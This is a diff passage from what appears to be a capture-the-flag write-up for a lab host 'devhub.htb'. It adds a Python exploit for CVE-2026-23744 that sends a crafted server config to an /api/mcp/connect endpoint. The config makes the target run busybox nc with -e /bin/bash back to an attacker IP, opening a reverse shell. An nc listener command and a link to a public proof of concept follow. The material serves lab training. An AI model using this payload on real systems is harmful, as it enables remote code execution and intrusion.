@@ -57,12 +57,35 @@ nmap -p 6274 -sV devhub.htb
 
 **PoC:** [github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC](https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC)
 
+```bash
+# exploit.py
+exploit.py
+import requests
+
+target = "http://devhub.htb:6274"
+ip     = "10.10.14.215"   # Ganti dengan IP attacker
+port   = "4444"
+
+url  = f'{target}/api/mcp/connect'
+data = {
+    "serverConfig": {
+        "command": "busybox",
+        "args": ["nc", ip, port, "-e", "/bin/bash"],
+        "env": {}
+    },
+    "serverId": "213j1l3jkljkl3j"
+}
+
+response = requests.post(url, json=data, verify=False)
+print(response.status_code)
+print(response.text)
+```
+
 **Эксплуатация вручную:**
 
 ```bash
 # Слушатель
 nc -lvnp 4444
-
 
 # Отправка полезной нагрузки
 python3 exploit.py
